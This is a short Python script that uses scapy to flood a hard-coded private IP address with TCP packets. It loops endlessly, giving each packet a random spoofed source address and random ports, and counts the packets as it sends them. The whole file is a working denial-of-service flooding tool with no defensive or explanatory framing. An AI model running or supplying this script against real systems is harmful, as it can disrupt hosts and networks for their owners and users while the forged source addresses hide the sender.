from scapy.all import *
import sys

target = "192.168.0.11"
message = "Package send"

def main():
    try:
        count = 0
        while True:
            src_ip = RandIP()
            s_port = RandShort()
            d_port = RandShort()

            ip_layer = IP(src=src_ip, dst=target)
            tpc_layer = TCP(sport=s_port, dport=d_port)
            raw_layer = Raw(load=message)

            final_packet = ip_layer/tpc_layer/raw_layer
            send(final_packet, verbose=False)
            count = count + 1
            print("\rN.Package: {}\tIP SRC: {}\tSRC PORT: {}".format(count, src_ip, s_port)),sys.stdout.flush()


    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()